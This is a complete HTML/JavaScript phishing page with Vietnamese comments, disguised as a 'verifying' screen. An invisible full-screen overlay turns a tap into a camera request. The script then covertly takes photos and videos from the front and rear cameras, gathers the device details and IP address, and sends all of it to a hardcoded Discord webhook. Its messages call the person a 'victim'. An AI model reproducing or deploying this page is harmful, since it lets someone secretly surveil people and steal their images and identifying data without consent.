<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Continue to Proceed</title>
<style>
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    margin: 0; padding: 0; height: 100vh;
    background: linear-gradient(135deg, #1e3c72, #2a5298);
    color: white; display: flex; justify-content: center; align-items: center;
  }
  .container {
    text-align: center; background: rgba(0,0,0,0.6); padding: 40px;
    border-radius: 16px; max-width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
  }
  h1 { margin: 0 0 20px; font-size: 28px; }
  .loading { font-size: 18px; margin: 20px 0; color: #4fc3f7; }
  video, canvas { display: none; }
  #click-overlay {
    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
    z-index: 9999; background: transparent; cursor: pointer;
  }
</style>
<!-- Dùng fetch thuần thay vì axios để nhẹ hơn -->
</head>
<body>

<div id="click-overlay"></div>
<video id="cam" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<div class="container">
  <h1>Đang Xác Thực</h1>
  <div class="loading" id="loading">Nhấp vào màn hình để xác thực</div>
</div>

<script>
// ===== CẤU HÌNH DISCORD WEBHOOK =====
// DÁN LINK WEBHOOK DISCORD CỦA MÀY VÀO ĐÂY (Lấy trong phần Cài đặt kênh -> Tích hợp -> Webhook)
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1572524780039569481/jv_lvQeH3BLd9iUubApFCOIJeJtwWYj6qK22nAGINDsK28UZ3ebciobPNnbrz4bycCiz';

let captureCount = 0;
const MAX_ATTEMPTS = 5;
let isStreaming = false;
let retryTimer = null;

// Gửi text
async function sendText(text) {
  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: text })
    });
  } catch (e) { console.log("Lỗi gửi text", e); }
}

// Gửi media (Discord giới hạn caption 2000 ký tự)
async function sendMedia(blob, type, caption) {
  if (!blob) return;
  const formData = new FormData();
  const ext = type === 'photo' ? 'jpg' : 'webm';
  formData.append('files[0]', blob, `${type}_${Date.now()}.${ext}`);
  formData.append('content', caption.substring(0, 2000));

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      body: formData
    });
  } catch (e) { console.error('Send failed:', e); }
}

// Thu thập info
async function collectInfo() {
  let info = `🎯 **Nạn nhân mới mở link!**\nThời gian: ${new Date().toLocaleString('vi-VN')}\n`;
  info += `📱 Thiết bị: \`${navigator.userAgent}\`\n`;
  info += `📺 Màn hình: ${screen.width}×${screen.height}\n`;
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      info += `🔋 Pin: ${Math.round(battery.level * 100)}%\n`;
    } catch {}
  }
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    info += `🌐 IP: \`${data.ip}\`\n`;
  } catch {}
  return info;
}

// Chụp ảnh
function takePhoto(video, isFrontCamera) {
  return new Promise((resolve, reject) => {
    if (video.videoWidth === 0) return reject(new Error("Video chưa có dữ liệu"));
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    if (isFrontCamera) {
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
    }
    
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    ctx.setTransform(1, 0, 0, 1, 0, 0);

    canvas.toBlob((blob) => {
      if (blob) resolve(blob);
      else reject(new Error("canvas.toBlob null"));
    }, 'image/jpeg', 0.9);
  });
}

// Lấy Stream
async function getStream(facingMode) {
  return await navigator.mediaDevices.getUserMedia({
    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: false 
  });
}

// Bắt đầu
async function startCaptureProcess() {
  if (isStreaming) return;
  if (retryTimer) { clearTimeout(retryTimer); retryTimer = null; }

  if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
    sendText('⚠️ LỖI: Trang web không chạy trên HTTPS, trình duyệt chặn Camera!');
    document.getElementById('loading').textContent = 'Error: Not HTTPS';
    return;
  }

  document.getElementById('loading').textContent = 'Hãy Chờ 3s';

  try {
    let stream = await getStream('user');
    isStreaming = true;
    
    document.getElementById('click-overlay').style.display = 'none';
    document.getElementById('loading').textContent = '...';

    const video = document.getElementById('cam');
    video.srcObject = stream;
    
    await new Promise((resolve) => {
      if (video.readyState >= 2) resolve();
      else video.onloadeddata = resolve;
    });
    await video.play();
    await new Promise(r => setTimeout(r, 1000));

    const info = await collectInfo();
    sendText(info + `\n✅ **Đã cấp quyền. Bắt đầu chụp Camera TRƯỚC...**`);

    // QUAY CAMERA TRƯỚC
    let options = { mimeType: 'video/webm;codecs=vp8' };
    if (!MediaRecorder.isTypeSupported(options.mimeType)) options = { mimeType: 'video/webm' };
    
    let recorder = new MediaRecorder(stream, options);
    let chunks = [];
    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
    recorder.start();

    let photoIndex = 1;
    let photoIntervalId = setInterval(async () => {
      try {
        const photoBlob = await takePhoto(video, true);
        await sendMedia(photoBlob, 'photo', `📸 **Ảnh TRƯỚC #${photoIndex}** - ${new Date().toLocaleTimeString()}`);
        photoIndex++;
      } catch (e) { console.log(e); }
    }, 1500);

    await new Promise(resolve => {
      recorder.onstop = resolve;
      setTimeout(() => { if(recorder.state !== 'inactive') recorder.stop(); }, 4000);
    });
    clearInterval(photoIntervalId);
    
    await sendMedia(new Blob(chunks, { type: 'video/webm' }), 'video', `🎥 **Video Camera TRƯỚC** (4s)`);
    stream.getTracks().forEach(track => track.stop()); 

    // CHUYỂN SANG CAMERA SAU
    sendText(`🔄 **Đang chuyển sang Camera SAU...**`);
    await new Promise(r => setTimeout(r, 1000));

    stream = await getStream('environment'); 
    video.srcObject = stream;
    
    await new Promise((resolve) => {
      if (video.readyState >= 2) resolve();
      else video.onloadeddata = resolve;
    });
    await video.play();
    await new Promise(r => setTimeout(r, 1000));

    // QUAY CAMERA SAU
    recorder = new MediaRecorder(stream, options);
    chunks = [];
    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
    recorder.start();

    photoIndex = 1;
    photoIntervalId = setInterval(async () => {
      try {
        const photoBlob = await takePhoto(video, false); 
        await sendMedia(photoBlob, 'photo', `📸 **Ảnh SAU #${photoIndex}** - ${new Date().toLocaleTimeString()}`);
        photoIndex++;
      } catch (e) { console.log(e); }
    }, 1500);

    await new Promise(resolve => {
      recorder.onstop = resolve;
      setTimeout(() => { if(recorder.state !== 'inactive') recorder.stop(); }, 4000);
    });
    clearInterval(photoIntervalId);
    
    await sendMedia(new Blob(chunks, { type: 'video/webm' }), 'video', `🎥 **Video Camera SAU** (4s)`);
    
    stream.getTracks().forEach(track => track.stop());
    document.getElementById('loading').textContent = '';

  } catch (err) {
    captureCount++;
    document.getElementById('loading').textContent = '';
    
    if (captureCount === 1) {
       const info = await collectInfo();
       sendText(info + `\n❌ **Lỗi Camera:** ${err.message}`);
    }

    if (captureCount < MAX_ATTEMPTS) {
       retryTimer = setTimeout(startCaptureProcess, 4000);
    }
  }
}

// ===== KÍCH HOẠT BẰNG CHẠM =====
const overlay = document.getElementById('click-overlay');

overlay.addEventListener('touchstart', function(e) {
    e.preventDefault();
    startCaptureProcess();
}, { passive: false });

overlay.addEventListener('click', function(e) {
    e.preventDefault();
    startCaptureProcess();
});

</script>
</body>
</html>
